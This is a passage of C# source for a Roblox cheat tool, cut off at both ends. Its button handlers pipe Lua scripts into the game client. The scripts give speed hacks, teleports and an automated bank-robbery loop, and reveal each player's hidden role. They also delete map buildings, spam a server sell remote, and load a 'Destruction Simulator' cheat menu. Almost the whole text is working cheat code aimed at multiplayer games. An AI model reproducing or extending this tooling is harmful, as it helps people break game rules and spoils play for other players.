      this.formSkin1.FlatColor = System.Drawing.Color.Maroon;
      this.formSkin1.Refresh();
    }

    private void flatButton204_Click_1(object sender, EventArgs e)
    {
      this.formSkin1.FlatColor = System.Drawing.Color.DarkRed;
      this.formSkin1.Refresh();
    }

    private void flatButton204_Click_2(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("plr = game:GetService('Players').LocalPlayer for i, v in pairs(plr.Character:GetChildren()) do if v.Name == 'Head' then for a, b in pairs(v:GetChildren()) do if b.Name == 'face' then b:remove() end end end end");
      NamedPipes.LuaPipe("_G.WalkSpeed = 150 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton205_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("function GetFrom(model) return game:GetService'Workspace'[tostring(model)]:GetChildren()[1].Extra:FindFirstChild'Sign'.Decal; end local bank = GetFrom'Banks' local jewelry = GetFrom'Jewelrys' bank.Changed:connect(function(prop) if prop == 'Transparency' then if bank.Transparency ~= 0 then print('Bank is open')end end end) jewelry.Changed:connect(function(prop)if prop == 'Transparency' then if jewelry.Transparency ~= 0 then print('Jewelry is open') end end end) print('Stores Ready To Rob: (If nothing shows, nothing is ready)') if GetFrom'Banks'.Transparency ~= 0 then print('Bank is open') end if GetFrom'Banks'.Transparency ~= 0 then print('Jewelry is open') end");
    }

    private void flatButton207_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 150 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton206_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 250 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton208_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 100 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton209_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 20 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton210_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=552829794' harambe.TextureId = 'http://www.roblox.com/asset/?id=552829827' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton214_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=469685350' harambe.TextureId = 'http://www.roblox.com/asset/?id=469685354' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton213_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=511726060' harambe.TextureId = 'http://www.roblox.com/asset/?id=511726139' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton212_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=1470340632' harambe.TextureId = 'http://www.roblox.com/asset/?id=1470340700' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton211_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=431532852' harambe.TextureId = 'http://www.roblox.com/asset/?id=431532899' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton215_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=431009042' harambe.TextureId = 'http://www.roblox.com/asset/?id=431009057' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton221_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=552829794' harambe.TextureId = 'http://www.roblox.com/asset/?id=552829827' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton217_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=430154514' harambe.TextureId = 'http://www.roblox.com/asset/?id=430154546' harambe.Scale = Vector3.new(.14,.14,.14) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton218_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=573811230' harambe.TextureId = 'http://www.roblox.com/asset/?id=573811243' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton219_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=441564090' harambe.TextureId = 'http://www.roblox.com/asset/?id=441564112' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton220_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=552469340' harambe.TextureId = 'http://www.roblox.com/asset/?id=552469494' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton216_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=1510346896' harambe.TextureId = 'http://www.roblox.com/asset/?id=1510346909' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton227_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=468181716' harambe.TextureId = 'http://www.roblox.com/asset/?id=468181736' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton223_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=430054742' harambe.TextureId = 'http://www.roblox.com/asset/?id=430054760' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton224_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=867409269' harambe.TextureId = 'http://www.roblox.com/asset/?id=867409310' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton225_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=440417814' harambe.TextureId = 'http://www.roblox.com/asset/?id=440417863' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton226_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=439932123' harambe.TextureId = 'http://www.roblox.com/asset/?id=439932211' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton222_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=435804314' harambe.TextureId = 'http://www.roblox.com/asset/?id=435804315' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton239_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Press F9 to check IT. ", "Search Diamante", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      NamedPipes.LuaPipe("for i,v in pairs(game.Players:GetChildren()) do if v.Backpack.Knife ~= nil or v.Character.Knife ~= nil then print(v.Name .. ' is murderer') end end for i,v in pairs(game.Players:GetChildren()) do if v.Backpack.Gun ~= nil or v.Backpack.Revolver ~= nil or v.Character.Gun ~= nil or v.Character.Revolver ~= nil then print(v.Name .. ' is sheriff') end end if workspace.GunDrop ~= nil then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.GunDrop.Position) end");
    }

    private void flatButton238_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').LocalPlayer.Character.Humanoid.Name = 1 local l = game:GetService('Players').LocalPlayer.Character['1']:Clone() l.Parent = game:GetService('Players').LocalPlayer.Character l.Name = 'Humanoid' wait(0.1) game:GetService('Players').LocalPlayer.Character['1']:Destroy() game:GetService('Workspace').CurrentCamera.CameraSubject = game:GetService('Players').LocalPlayer.Character game:GetService('Players').LocalPlayer.Character.Animate.Disabled = true wait(0.1) game:GetService('Players').LocalPlayer.Character.Animate.Disabled = false game:GetService('Players').LocalPlayer.Character.Humanoid.DisplayDistanceType = 'None'");
    }

    private void flatButton237_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("Workspace.Bush:Destroy()\nWorkspace.Buildings:ClearAllChildren()\nWorkspace.Apartments:ClearAllChildren()\nWorkspace.Trees:ClearAllChildren()");
    }

    private void flatButton236_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,45 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1473.9, -0.30, -1877.6) end");
    }

    private void flatButton235_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("plr = game:GetService('Players').LocalPlayer for i, v in pairs(plr.Character:GetChildren()) do if v.Name == 'Head' then for a, b in pairs(v:GetChildren()) do if b.Name == 'face' then b:remove() end end end end");
    }

    private void flatButton234_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,45 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1541.10388, 17.746624, 729) end");
    }

    private void flatButton233_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Press R to fly while in a car around.");
      NamedPipes.LuaPipe("local plr = game:GetService'Players'.LocalPlayer\r\nlocal m = plr:GetMouse()\r\nm.KeyDown:connect(function(k)\r\nif k:byte() == 114 then\r\nplrh = game:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass'Humanoid'\r\nplrh:ChangeState('Jumping')\r\nwait()\r\nplrh:ChangeState('Seated')\r\nend\r\nend)");
    }

    private void flatButton232_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.Parent = game.Lighting\r\n                                 game.Lighting.HumanoidRootPart.Parent = game:GetService('Players').LocalPlayer.Character");
    }

    private void flatButton231_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("while true do wait(10) local plr = game:GetService('Players').LocalPlayer if game:GetService('Workspace').Banks:GetChildren()[1].Extra.Sign.Decal.Transparency ~= 0 then for i = 1,50 do wait(0.12) plr.Character.HumanoidRootPart.CFrame = CFrame.new(94,19.9,835.9) end wait(2) plr.Character.HumanoidRootPart.CFrame = CFrame.new(51.3, 18.6, 857.9) wait(.7) plr.Character.HumanoidRootPart.CFrame = CFrame.new(28.16, 1.5, 816.20) wait(.7) plr.Character.HumanoidRootPart.CFrame = CFrame.new(20,1.5,816.20) for i = 1,150 do wait(1) if plr.PlayerGui.MainGui.CollectMoney.Money.Text == ('$3,000') then plr.Character.HumanoidRootPart.CFrame = CFrame.new(94,19.9,895.9) plr.PlayerGui.MainGui.CollectMoney.Money.Text = ('3,00O') wait(60) end end else warn('The Bank is Closed!') end end");
    }

    private void flatButton230_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("CHANGED!", "AUTO_ROB!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      NamedPipes.LuaPipe("game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1068.19863, 138.433548, 1212.92762) + Vector3.new(1,0,0) wait(3.00) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1126.33667, 114.880119, 1167.11902) + Vector3.new(1,0,0) wait(6.00) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1638.08044, 49.9363251, -1803.09412) + Vector3.new(1,0,0)");
    }

    private void flatButton229_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Press F9 to Check if there disabled ", "Chaosity", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      NamedPipes.LuaPipe("for i,v in pairs(game.Players:GetChildren()) do if v.Backpack.Knife ~= nil or v.Character.Knife ~= nil then print(v.Name .. ' is murderer') end end for i,v in pairs(game.Players:GetChildren()) do if v.Backpack.Gun ~= nil or v.Backpack.Revolver ~= nil or v.Character.Gun ~= nil or v.Character.Revolver ~= nil then print(v.Name .. ' is sheriff') end end if workspace.GunDrop ~= nil then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.GunDrop.Position) end");
    }

    private void flatButton228_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local hit = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,0,-3) a = Instance.new('Part', workspace) a.Anchored = true a.Position = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,0,-3) a.CanCollide = false for i, v in pairs(game:GetService('Workspace').Givers:GetChildren()) do if v.Name == 'Station' then for a, b in pairs(v:GetChildren()) do if b:IsA('StringValue') then if b.Value == 'RifleSWAT' then v.CFrame = CFrame.new(hit) end end end end end");
    }

    private void flatButton245_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=448864096' harambe.TextureId = 'http://www.roblox.com/asset/?id=448864100' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton241_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=862171572' harambe.TextureId = 'http://www.roblox.com/asset/?id=862171612' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton242_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=927014386' harambe.TextureId = 'http://www.roblox.com/asset/?id=927014392' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton243_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=1346202616' harambe.TextureId = 'http://www.roblox.com/asset/?id=1346202636' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton244_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=2177678221' harambe.TextureId = 'http://www.roblox.com/asset/?id=2177678230' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton240_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=497389647' harambe.TextureId = 'http://www.roblox.com/asset/?id=497389649' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton251_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=468181716' harambe.TextureId = 'http://www.roblox.com/asset/?id=468181736' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton247_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=452061527' harambe.TextureId = 'http://www.roblox.com/asset/?id=452061533' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton248_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=516341432' harambe.TextureId = 'http://www.roblox.com/asset/?id=516341451' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton249_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=430571807' harambe.TextureId = 'http://www.roblox.com/asset/?id=430571813' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton250_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=520872304' harambe.TextureId = 'http://www.roblox.com/asset/?id=520872307' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton246_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=497456475' harambe.TextureId = 'http://www.roblox.com/asset/?id=497456477' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton252_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("while true do\n   game.ReplicatedStorage.Remotes.sellBricks:FireServer()\n   wait(0.10)\nend");
    }

    private void flatButton253_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("wait(0.01)\n \ngame.StarterGui:SetCore('ChatMakeSystemMessage', {\n    Text = 'Ran, Made by Chaosity!';\n    Color = Color3.new(0, 185, 0);\n    Font = Enum.Font.SourceSansBold;\n    FontSize = Enum.FontSize.Size24;\n})\nwait(1)\ngame.StarterGui:SetCore('ChatMakeSystemMessage', {\n    Text = 'Scripts by JlmmyKewlKiDz Chaosity!';\n    Color = Color3.new(170, 0, 0);\n    Font = Enum.Font.SourceSansBold;\n    FontSize = Enum.FontSize.Size24;\n})\n\n\n-- Made by Atom\n\n-- Scripts to JlmmyKewlKiDz\n\n\nlocal Name = game.Players.LocalPlayer.Name\n\nlocal DestructionSim = Instance.new('ScreenGui')\nlocal BG = Instance.new('Frame')\nlocal BGDETAIL = Instance.new('Frame')\nlocal DetailLabel = Instance.new('TextLabel')\nlocal AutoSell = Instance.new('TextButton')\nlocal Shop = Instance.new('TextButton')\nlocal AutoFarm = Instance.new('TextButton')\nlocal Site = Instance.new('TextButton')\nlocal Home = Instance.new('TextButton')\nlocal Ship = Instance.new('TextButton')\nlocal Space = Instance.new('TextButton')\nlocal Camp = Instance.new('TextButton')\nlocal Pillar = Instance.new('TextButton')\nlocal Castle = Instance.new('TextButton')\nlocal Empire = Instance.new('TextButton')\nlocal Exit = Instance.new('TextButton')\nlocal Farm = Instance.new('TextButton')\n\nDestructionSim.Name = 'DestructionSim'\nDestructionSim.Parent = game.CoreGui\n\nBG.Name = 'BG'\nBG.Parent = DestructionSim\nBG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)\nBG.BorderColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nBG.Position = UDim2.new(0.629268289, 0, 0.380478084, 0)\nBG.Size = UDim2.new(0, 270, 0, 257)\nBG.Active = true\nBG.Draggable = true\n\nBGDETAIL.Name = 'BGDETAIL'\nBGDETAIL.Parent = BG\nBGDETAIL.BackgroundColor3 = Color3.new(0.458824, 0.792157, 1)\nBGDETAIL.BorderColor3 = Color3.new(0.352941, 0.643137, 0.807843)\nBGDETAIL.Size = UDim2.new(0, 270, 0, 30)\n\nDetailLabel.Name = 'DetailLabel'\nDetailLabel.Parent = BGDETAIL\nDetailLabel.BackgroundColor3 = Color3.new(1, 1, 1)\nDetailLabel.BackgroundTransparency = 1\nDetailLabel.Position = UDim2.new(0.129629590, 0, 0, 0)\nDetailLabel.Size = UDim2.new(0, 230, 0, 30)\nDetailLabel.Font = Enum.Font.SourceSansBold\nDetailLabel.Text = 'Destruction Simulator'\nDetailLabel.TextColor3 = Color3.new(1, 1, 1)\nDetailLabel.TextScaled = true\nDetailLabel.TextSize = 14\nDetailLabel.TextWrapped = true\n\nAutoSell.Name = 'AutoSell'\nAutoSell.Parent = BG\nAutoSell.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nAutoSell.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nAutoSell.Position = UDim2.new(0.0333333351, 0, 0.176002949, 0)\nAutoSell.Size = UDim2.new(0, 107, 0, 22)\nAutoSell.Font = Enum.Font.SourceSansBold\nAutoSell.Text = 'Auto Sell'\nAutoSell.TextColor3 = Color3.new(1, 1, 1)\nAutoSell.TextScaled = true\nAutoSell.TextSize = 14\nAutoSell.TextWrapped = true\n\nAutoSell.MouseButton1Click:connect(function()\nlocal remote = game['ReplicatedStorage']['Remotes']['sellBricks']\nwhile true do\n   remote:FireServer()\n   wait(12.5)\nend\nend)\n\nShop.Name = 'Shop'\nShop.Parent = BG\nShop.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nShop.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nShop.Position = UDim2.new(0.566666663, 0, 0.176724136, 0)\nShop.Size = UDim2.new(0, 107, 0, 22)\nShop.Font = Enum.Font.SourceSansBold\nShop.Text = 'Teleport to Shop'\nShop.TextColor3 = Color3.new(1, 1, 